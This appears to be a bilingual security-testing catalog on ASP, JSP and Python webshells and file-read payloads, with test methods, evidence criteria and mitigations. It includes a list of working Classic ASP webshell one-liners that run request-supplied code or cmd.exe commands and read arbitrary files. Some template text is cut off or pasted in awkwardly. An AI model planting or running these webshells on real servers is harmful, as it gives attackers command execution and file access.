title.en: Establish the Classic ASP Request Execution baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“ASP 处理器日志、请求参数、固定标记输出与 FileSystemObject 或 WScript.Shell 审计事件对应”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting ASP handler logs, request values, fixed marker output, and FileSystemObject or WScript.Shell audit events correlate as abnormal evidence.

title.zh: 逐行验证“Classic ASP 动态执行与文件读取”
title.en: Validate Classic ASP Dynamic Execution and File Reading line by line

description.zh: 测试步骤为：在隔离 IIS 分别测试 eval/execute、测试文件读取和固定 cmd echo 三类路径，不读取系统文件或执行持久化操作。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: test eval or execute, test-file reads, and fixed cmd echo paths separately in isolated IIS without reading system files or performing persistence. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

attackChain.payload:
<%execute(request("a"))%>
<%execute request("a")%>
<%eval(request("a"))%>
<%eval request("a")%>
<%=execute(request("a"))%>
<%=eval(request("a"))%>
<%response.write server.createobject("scripting.filesystemobject").opentextfile(request("f"),1).readall%>
<%response.write server.createobject("scripting.filesystemobject").readfile(request("f"))%>
<%set f=server.createobject("scripting.filesystemobject"):response.write f.opentextfile(request("f"),1).readall%>
<%dim f:set f=server.createobject("scripting.filesystemobject"):response.write f.opentextfile(request("f"),1).readall%>
<%set w=server.createobject("wscript.shell"):response.write w.exec("cmd.exe /c "&request("cmd")).stdout.readall%>
<%dim w:set w=server.createobject("wscript.shell"):response.write w.exec("cmd.exe /c "&request("cmd")).stdout.readall%>

name.zh: JSP Runtime 与 ProcessBuilder WebShell

description.zh: 覆盖 Runtime.exec、ProcessBuilder、Scanner/IOUtils 输出、ServletContext 文件流和脚本引擎形式，验证 JSP 请求参数到 Java 进程或文件 API 的路径。
description.en: Covers Runtime.exec, ProcessBuilder, Scanner or IOUtils output, ServletContext streams, and script-engine forms to test JSP request-to-process or file API paths.

overview.zh: JSP Runtime 与 ProcessBuilder WebShell用于核对JSP request.getParameter 是否到达 Runtime、ProcessBuilder、脚本引擎或 ServletContext 资源读取，并如何返回输出。该条目只在以下前提下适用：可写 JSP 被容器编译执行，应用身份允许创建进程或读取资源，且请求参数未经过固定命令和路径约束。有效判定必须取得JSP 编译类、容器访问日志、请求参数、固定 stdout 或测试资源标记以及子进程审计相对应；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: JSP Runtime and ProcessBuilder Webshells checks whether JSP request.getParameter reaches Runtime, ProcessBuilder, script engines, or ServletContext resource reads and how output is returned. It applies when a writable JSP is compiled by the container, the application identity can create processes or read resources, and request values lack fixed command and path constraints. A valid finding requires the compiled JSP class, container access log, request value, fixed stdout or test-resource marker, and child-process audit correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是可写 JSP 被容器编译执行，应用身份允许创建进程或读取资源，且请求参数未经过固定命令和路径约束，使应用可能暴露“JSP request.getParameter 是否到达 Runtime、ProcessBuilder、脚本引擎或 ServletContext 资源读取，并如何返回输出”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when a writable JSP is compiled by the container, the application identity can create processes or read resources, and request values lack fixed command and path constraints, exposing the runtime boundary of whether JSP request.getParameter reaches Runtime, ProcessBuilder, script engines, or ServletContext resource reads and how output is returned. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 在一次性 Servlet 容器按 Runtime、ProcessBuilder、输出读取、资源流和脚本引擎分组，使用固定 echo 与专用测试资源逐类验证。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: group tests by Runtime, ProcessBuilder, output readers, resource streams, and script engines in a disposable servlet container using fixed echo and dedicated test resources. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 上传和模板目录禁用 JSP 编译，删除请求到进程 API 的映射，容器以最小权限运行并限制子进程、文件系统和脚本引擎。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: disable JSP compilation in upload and template storage, remove request-to-process mappings, and run the container with least privilege and restrictions on child processes, files, and script engines. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

title.zh: 确认“JSP Runtime 与 ProcessBuilder WebShell”执行入口
title.en: Confirm the JSP Runtime and ProcessBuilder Webshells execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“可写 JSP 被容器编译执行，应用身份允许创建进程或读取资源，且请求参数未经过固定命令和路径约束”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that a writable JSP is compiled by the container, the application identity can create processes or read resources, and request values lack fixed command and path constraints, and record runtime version and service identity.

title.zh: 建立“JSP/Servlet 进程执行”安全基线
title.en: Establish the JSP and Servlet Process Execution baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“JSP 编译类、容器访问日志、请求参数、固定 stdout 或测试资源标记以及子进程审计相对应”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the compiled JSP class, container access log, request value, fixed stdout or test-resource marker, and child-process audit correlate as abnormal evidence.

title.zh: 逐行验证“JSP Runtime 与 ProcessBuilder WebShell”
title.en: Validate JSP Runtime and ProcessBuilder Webshells line by line

description.zh: 测试步骤为：在一次性 Servlet 容器按 Runtime、ProcessBuilder、输出读取、资源流和脚本引擎分组，使用固定 echo 与专用测试资源逐类验证。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: group tests by Runtime, ProcessBuilder, output readers, resource streams, and script engines in a disposable servlet container using fixed echo and dedicated test resources. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

title.zh: 修复运行时边界并回归
title.en: Remediate and regress the runtime boundary

description.zh: 实施“上传和模板目录禁用 JSP 编译，删除请求到进程 API 的映射，容器以最小权限运行并限制子进程、文件系统和脚本引擎”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。
description.en: After applying disable JSP compilation in upload and template storage, remove request-to-process mappings, and run the container with least privilege and restrictions on child processes, files, and script engines, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable.

review.rationale: JSP Runtime 与 ProcessBuilder WebShell保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已在授权隔离环境定位“JSP Runtime 与 ProcessBuilder WebShell”的真实输入点、处理器和运行时版本，并确认：可写 JSP 被容器编译执行，应用身份允许创建进程或读取资源，且请求参数未经过固定命令和路径约束。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for JSP Runtime and ProcessBuilder Webshells, confirming that a writable JSP is compiled by the container, the application identity can create processes or read resources, and request values lack fixed command and path constraints.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察JSP 编译类、容器访问日志、请求参数、固定 stdout 或测试资源标记以及子进程审计相对应。
prerequisites.en: The test worker is disposable and can observe the compiled JSP class, container access log, request value, fixed stdout or test-resource marker, and child-process audit correlate.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得JSP 编译类、容器访问日志、请求参数、固定 stdout 或测试资源标记以及子进程审计相对应。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“JSP request.getParameter 是否到达 Runtime、ProcessBuilder、脚本引擎或 ServletContext 资源读取，并如何返回输出”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus the compiled JSP class, container access log, request value, fixed stdout or test-resource marker, and child-process audit correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether JSP request.getParameter reaches Runtime, ProcessBuilder, script engines, or ServletContext resource reads and how output is returned.

opsecTips.zh: JSP Runtime 与 ProcessBuilder WebShell停止条件：“JSP Runtime 与 ProcessBuilder WebShell”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“JSP request.getParameter 是否到达 Runtime、ProcessBuilder、脚本引擎或 ServletContext 资源读取，并如何返回输出”。
opsecTips.en: JSP Runtime and ProcessBuilder Webshells stop condition: Use only a one-time fixed marker for JSP Runtime and ProcessBuilder Webshells; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether JSP request.

opsecTips.zh: JSP Runtime 与 ProcessBuilder WebShell清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: JSP Runtime and ProcessBuilder Webshells cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

name.zh: JSP 本地文件读取片段

description.zh: 使用 Scanner、BufferedReader 与 FileInputStream 读取系统路径和 WEB-INF 资源，属于已执行 JSP 上下文中的文件读取 Payload。
description.en: Uses Scanner, BufferedReader, and FileInputStream to read system paths and WEB-INF resources; these are file-read payloads inside an already executing JSP context.

overview.zh: JSP 本地文件读取片段属于已获得服务器端代码执行上下文后的文件读取样例，验证目标为JSP 容器身份通过不同 Java 文件 API 能否读取请求者原本无法访问的本地或应用资源。成立前提为：攻击者已能执行或写入 JSP，容器身份具有目标文件读取权限，且代码没有固定资源映射。必须以专用无敏感测试文件中的唯一标记、容器文件审计和 JSP 响应能够对应作为证据，不能从路径字符串或异常消息推断文件内容已泄露。
overview.en: JSP Local File Read Snippets contains file-read samples used after server-side code execution, testing whether the JSP container identity can read local or application resources unavailable to the requester through several Java file APIs. It applies when the attacker can execute or write JSP, the container identity can read the target file, and code lacks a fixed resource mapping. Evidence requires a unique marker in a dedicated nonsensitive test file, container file auditing, and the JSP response correlate; path strings and error messages do not prove content disclosure.

vulnerability.zh: 风险边界是攻击者已能执行或写入 JSP，容器身份具有目标文件读取权限，且代码没有固定资源映射，使运行时可能暴露“JSP 容器身份通过不同 Java 文件 API 能否读取请求者原本无法访问的本地或应用资源”。应明确这是 WebShell/代码执行后的能力确认，而不是独立 LFI；报告必须说明服务身份、规范路径、读取 API 和实际最小数据范围。
vulnerability.en: The boundary exists when the attacker can execute or write JSP, the container identity can read the target file, and code lacks a fixed resource mapping, exposing whether the JSP container identity can read local or application resources unavailable to the requester through several Java file APIs. This is post-webshell or post-code-execution capability confirmation rather than standalone LFI, and reports must state service identity, canonical path, API, and minimal data scope.

exploitation.zh: 将所有系统与 flag 路径替换为容器挂载的只读测试文件，分别验证 Scanner、Reader 与 FileInputStream，记录目录目标导致的异常。所有系统、flag、配置和源码路径均替换为专用无敏感测试文件或目录；每轮只调用一个文件 API，并保存打开路径、权限结果、响应标记和清理记录。
exploitation.en: replace all system and flag paths with a read-only mounted test file, validate Scanner, Reader, and FileInputStream separately, and record exceptions from directory targets. Replace every system, flag, configuration, and source path with a dedicated nonsensitive test file or directory, invoke one file API per run, and preserve opened path, permission result, response marker, and cleanup record.

mitigation.zh: 阻止上传 JSP 执行，容器身份仅访问业务目录，所有文件访问采用服务端对象 ID 与固定根目录，并对 WEB-INF 等资源拒绝动态路径。修复后以同一服务账户验证合法业务对象、目录外路径和符号链接边界，确认正常文件功能仍可用，同时对象映射与操作系统权限共同阻止越界读取。
mitigation.en: prevent uploaded JSP execution, restrict the container identity to business directories, use server-side object IDs with a fixed root for file access, and reject dynamic paths to WEB-INF and similar resources. Retest valid business objects, out-of-root paths, and symbolic-link boundaries under the same identity to preserve file features while object mapping and OS permissions block out-of-scope reads.

title.zh: 确认“JSP 本地文件读取片段”前置执行上下文
title.en: Confirm the JSP Local File Read Snippets prerequisite context

description.zh: 先证明代码执行或 WebShell 上下文已经存在，再核对文件读取前提“攻击者已能执行或写入 JSP，容器身份具有目标文件读取权限，且代码没有固定资源映射”。
description.en: Prove the code-execution or webshell context first, then confirm the file-read prerequisites: the attacker can execute or write JSP, the container identity can read the target file, and code lacks a fixed resource mapping.

title.zh: 建立专用测试文件基线
title.en: Establish a dedicated test-file baseline

description.zh: 挂载只含唯一标记的只读文件，记录规范路径、服务身份与权限，并以“专用无敏感测试文件中的唯一标记、容器文件审计和 JSP 响应能够对应”作为读取证据。
description.en: Mount a read-only file containing one marker, record canonical path, identity, and permissions, and use a unique marker in a dedicated nonsensitive test file, container file auditing, and the JSP response correlate as read evidence.

title.zh: 逐 API 验证“JSP 本地文件读取片段”
title.en: Validate JSP Local File Read Snippets by API

description.zh: 测试步骤为：将所有系统与 flag 路径替换为容器挂载的只读测试文件，分别验证 Scanner、Reader 与 FileInputStream，记录目录目标导致的异常。原命令保留用于引用，执行时所有敏感路径均替换为测试文件。
description.en: replace all system and flag paths with a read-only mounted test file, validate Scanner, Reader, and FileInputStream separately, and record exceptions from directory targets. Preserve original commands for reference while replacing every sensitive runtime path with the test file.

title.zh: 收紧文件边界并回归
title.en: Tighten file boundaries and regress

description.zh: 实施“阻止上传 JSP 执行，容器身份仅访问业务目录，所有文件访问采用服务端对象 ID 与固定根目录，并对 WEB-INF 等资源拒绝动态路径”后验证合法对象、越界路径与符号链接，确认正常读取保留且服务身份无法越权。
description.en: After applying prevent uploaded JSP execution, restrict the container identity to business directories, use server-side object IDs with a fixed root for file access, and reject dynamic paths to WEB-INF and similar resources, test valid objects, out-of-root paths, and symlinks to preserve valid reads while preventing identity overreach.

review.rationale: JSP 本地文件读取片段保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已先证明“JSP 本地文件读取片段”依赖的 WebShell/代码执行上下文，并确认：攻击者已能执行或写入 JSP，容器身份具有目标文件读取权限，且代码没有固定资源映射。
prerequisites.en: The prerequisite webshell or code-execution context for JSP Local File Read Snippets is proven, and the attacker can execute or write JSP, the container identity can read the target file, and code lacks a fixed resource mapping.

prerequisites.zh: 隔离环境只挂载含随机标记的无敏感测试文件或目录，可观察专用无敏感测试文件中的唯一标记、容器文件审计和 JSP 响应能够对应。
prerequisites.en: The isolated environment mounts only a nonsensitive marked test file or directory and can observe a unique marker in a dedicated nonsensitive test file, container file auditing, and the JSP response correlate.

analysis.zh: 阳性仅指服务身份通过指定 API 读到预置标记并取得专用无敏感测试文件中的唯一标记、容器文件审计和 JSP 响应能够对应。路径回显、权限/不存在异常、目录名或在已有 Shell 中直接 cat 均不能证明“JSP 容器身份通过不同 Java 文件 API 能否读取请求者原本无法访问的本地或应用资源”。
analysis.en: A positive means the service identity reads the planted marker through the specified API and a unique marker in a dedicated nonsensitive test file, container file auditing, and the JSP response correlate. Reflected paths, permission or not-found errors, directory names, or direct cat from an existing shell do not prove whether the JSP container identity can read local or application resources unavailable to the requester through several Java file APIs.

opsecTips.zh: JSP 本地文件读取片段停止条件：只访问专用测试文件；响应出现真实配置、环境变量、令牌、用户数据或系统文件片段时立即停止并隔离输出。 本条重点观察“JSP 容器身份通过不同 Java 文件 API 能否读取请求者原本无法访问的本地或应用资源”。
opsecTips.en: JSP Local File Read Snippets stop condition: Access only the dedicated test file; stop and isolate output if real configuration, environment values, tokens, user data, or system-file fragments appear. The entry-specific focus is whether the JSP container identity can read local or application resources unavailable to the requester through several Java file APIs.

opsecTips.zh: JSP 本地文件读取片段清理条件：测试后删除挂载文件和临时 WebShell，清空响应缓存并重建容器，确认报告与日志只保留随机标记。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: JSP Local File Read Snippets cleanup condition: Remove mounted files and temporary webshells, clear response caches, rebuild the container, and verify reports and logs retain only the random marker. Recheck that no triggerable state remains for this technique.

name.zh: Python 本地文件读取表达式

description.zh: 使用 open().read() 读取系统、进程、应用配置与容器文件，只有在 Python 求值或代码执行入口已成立时才是可用 Payload。
description.en: Uses open().read() against system, process, application, and container files; these payloads apply only after a Python evaluator or code-execution entry is confirmed.

subCategory.zh: Python 执行上下文文件读取

overview.zh: Python 本地文件读取表达式属于已获得服务器端代码执行上下文后的文件读取样例，验证目标为可控 Python 表达式是否以服务进程身份打开本地路径并把内容返回给请求者。成立前提为：应用存在 eval、模板、调试器或任务执行入口，服务身份可读目标路径，且没有文件对象映射与根目录限制。必须以预置测试文件的唯一标记、Python open 调用审计、工作进程和对应响应完整关联作为证据，不能从路径字符串或异常消息推断文件内容已泄露。
overview.en: Python Local File Read Expressions contains file-read samples used after server-side code execution, testing whether a controllable Python expression opens local paths under the service identity and returns content to the requester. It applies when the application exposes eval, templating, debugging, or task execution, the service identity can read the path, and no object mapping or root restriction exists. Evidence requires a planted test-file marker, Python open-call auditing, worker process, and response fully correlate; path strings and error messages do not prove content disclosure.

vulnerability.zh: 风险边界是应用存在 eval、模板、调试器或任务执行入口，服务身份可读目标路径，且没有文件对象映射与根目录限制，使运行时可能暴露“可控 Python 表达式是否以服务进程身份打开本地路径并把内容返回给请求者”。应明确这是 WebShell/代码执行后的能力确认，而不是独立 LFI；报告必须说明服务身份、规范路径、读取 API 和实际最小数据范围。
vulnerability.en: The boundary exists when the application exposes eval, templating, debugging, or task execution, the service identity can read the path, and no object mapping or root restriction exists, exposing whether a controllable Python expression opens local paths under the service identity and returns content to the requester. This is post-webshell or post-code-execution capability confirmation rather than standalone LFI, and reports must state service identity, canonical path, API, and minimal data scope.

exploitation.zh: 先用字符串和算术确认表达式执行，再只读取挂载的无敏感测试文件；逐个 API 路径验证并禁止访问 .env、配置或 proc 数据。所有系统、flag、配置和源码路径均替换为专用无敏感测试文件或目录；每轮只调用一个文件 API，并保存打开路径、权限结果、响应标记和清理记录。
exploitation.en: confirm expression evaluation with strings and arithmetic, then read only a mounted nonsensitive test file, validating API paths without accessing env, configuration, or proc data. Replace every system, flag, configuration, and source path with a dedicated nonsensitive test file or directory, invoke one file API per run, and preserve opened path, permission result, response marker, and cleanup record.

mitigation.zh: 移除动态 Python 求值，文件访问通过服务端对象 ID 和固定根目录，服务账户最小化文件权限并避免将秘密放入工作目录。修复后以同一服务账户验证合法业务对象、目录外路径和符号链接边界，确认正常文件功能仍可用，同时对象映射与操作系统权限共同阻止越界读取。
mitigation.en: remove dynamic Python evaluation, map file access through server-side object IDs and a fixed root, minimize service file permissions, and keep secrets out of the working directory. Retest valid business objects, out-of-root paths, and symbolic-link boundaries under the same identity to preserve file features while object mapping and OS permissions block out-of-scope reads.

title.zh: 确认“Python 本地文件读取表达式”前置执行上下文
title.en: Confirm the Python Local File Read Expressions prerequisite context

description.zh: 先证明代码执行或 WebShell 上下文已经存在，再核对文件读取前提“应用存在 eval、模板、调试器或任务执行入口，服务身份可读目标路径，且没有文件对象映射与根目录限制”。
